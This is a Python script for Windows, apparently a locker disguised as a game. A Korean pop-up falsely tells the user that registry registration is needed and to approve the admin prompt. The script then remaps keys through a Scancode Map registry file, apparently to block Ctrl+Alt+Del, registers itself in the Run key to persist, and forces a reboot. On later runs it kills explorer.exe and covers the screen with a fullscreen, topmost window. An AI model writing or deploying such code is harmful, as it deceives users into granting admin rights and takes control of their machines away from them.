import tkinter as t
import tkinter.messagebox as tm
import os
import time
global ran
def ex():
    global ran
    ran.destroy()
    os.system("explorer.exe")
try:
    c = open("C:/Users/Public/check.txt",'r')
    c.close()
    os.system("taskkill /IM explorer.exe /f")
    ran = t.Tk()
    e = t.Button(ran,text="exit",command = ex).pack()
    ran.attributes("-fullscreen", True)
    ran.attributes("-topmost", True)
    ran.mainloop()
except:
    c = open("C:/Users/Public/check.txt",'w')
    tm.showinfo("알림","프로그램을 실행하려면 레지스트리 등록이 필요합니다.\n관리자 확인 메시지가 표시되면 '예'를 클릭해주세요.")
    CAD_block = open("C:/Users/Public/change.reg",'w')
    c.write("ok")
    c.close()
    CAD_block.write("Windows Registry Editor Version 5.00\n\n[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout]\n\"Scancode Map\"=hex:00,00,00,00,00,00,00,00,03,00,00,00,38,00,5B,E0,5B,E0,38,00,00,00,00,00")
    CAD_block.close()
    os.system("Reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Auto /t REG_SZ /d \"C:/Users/Public/game_test1.py\" /f")
    os.system("C:/Users/Public/change.reg")
    os.system("shutdown -r -f -t 0")
